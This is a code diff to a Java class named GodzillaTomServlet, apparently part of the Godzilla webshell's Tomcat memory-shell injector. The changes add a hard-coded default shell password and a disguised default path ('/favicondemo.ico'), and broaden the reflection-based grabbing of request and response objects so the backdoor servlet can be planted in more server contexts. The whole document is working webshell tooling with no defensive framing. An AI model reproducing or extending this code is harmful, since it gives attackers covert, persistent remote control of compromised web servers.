@@ -108,8 +108,13 @@ public class GodzillaTomServlet extends ClassLoader implements Servlet {
 
     public boolean equals(Object obj) {
         this.parseObj(obj);
+        if (this.request == null) {
+            return false;
+        }
         this.Pwd = this.request.getHeader("p");
+        if (this.Pwd == null || this.Pwd.isEmpty()) this.Pwd = "pass1024";
         this.path = this.request.getHeader("path");
+        if (this.path == null || this.path.isEmpty()) this.path = "/favicondemo.ico";
         StringBuffer output = new StringBuffer();
         String tag_s = "->|";
         String tag_e = "|<-";
@@ -138,32 +143,40 @@ public class GodzillaTomServlet extends ClassLoader implements Servlet {
             Object[] data = (Object[])((Object[])obj);
             this.request = (HttpServletRequest)data[0];
             this.response = (HttpServletResponse)data[1];
-        } else {
-            try {
-                Class clazz = Class.forName("javax.servlet.jsp.PageContext");
-                this.request = (HttpServletRequest)clazz.getDeclaredMethod("getRequest").invoke(obj);
-                this.response = (HttpServletResponse)clazz.getDeclaredMethod("getResponse").invoke(obj);
-            } catch (Exception var8) {
-                if (obj instanceof HttpServletRequest) {
-                    this.request = (HttpServletRequest)obj;
-
-                    try {
-                        Field req = this.request.getClass().getDeclaredField("request");
-                        req.setAccessible(true);
-                        HttpServletRequest request2 = (HttpServletRequest)req.get(this.request);
-                        Field resp = request2.getClass().getDeclaredField("response");
-                        resp.setAccessible(true);
-                        this.response = (HttpServletResponse)resp.get(request2);
-                    } catch (Exception var7) {
-                        try {
-                            this.response = (HttpServletResponse)this.request.getClass().getDeclaredMethod("getResponse").invoke(obj);
-                        } catch (Exception var6) {
-                        }
-                    }
-                }
-            }
+            return;
         }
-
+        try {
+            Class clazz = Class.forName("javax.servlet.jsp.PageContext");
+            this.request = (HttpServletRequest)clazz.getDeclaredMethod("getRequest").invoke(obj);
+            this.response = (HttpServletResponse)clazz.getDeclaredMethod("getResponse").invoke(obj);
+            return;
+        } catch (Exception e) { }
+        if (obj instanceof HttpServletRequest) {
+            this.request = (HttpServletRequest)obj;
+            try {
+                Field req = this.request.getClass().getDeclaredField("request");
+                req.setAccessible(true);
+                HttpServletRequest request2 = (HttpServletRequest)req.get(this.request);
+                Field resp = request2.getClass().getDeclaredField("response");
+                resp.setAccessible(true);
+                this.response = (HttpServletResponse)resp.get(request2);
+                return;
+            } catch (Exception e) { }
+            try {
+                this.response = (HttpServletResponse)this.request.getClass().getDeclaredMethod("getResponse").invoke(obj);
+                return;
+            } catch (Exception e) { }
+        }
+        try {
+            Method getNote = obj.getClass().getMethod("getNote", int.class);
+            Object req = getNote.invoke(obj, 1);
+            if (req instanceof HttpServletRequest) {
+                this.request = (HttpServletRequest) req;
+                try {
+                    this.response = (HttpServletResponse) req.getClass().getMethod("getResponse").invoke(req);
+                } catch (Exception e) { }
+            }
+        } catch (Exception e) { }
     }
 
     private String addServlet() {
